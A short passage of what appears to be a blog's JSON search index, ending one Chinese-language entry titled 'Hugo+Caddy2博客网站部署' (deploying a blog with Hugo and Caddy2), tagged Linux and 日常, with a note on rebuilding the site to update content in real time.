重新构建网站，实时更新内容。\n","description":"","tags":["Linux","日常"],"title":"Hugo+Caddy2博客网站部署","uri":"/posts/id/195ngbb/"}]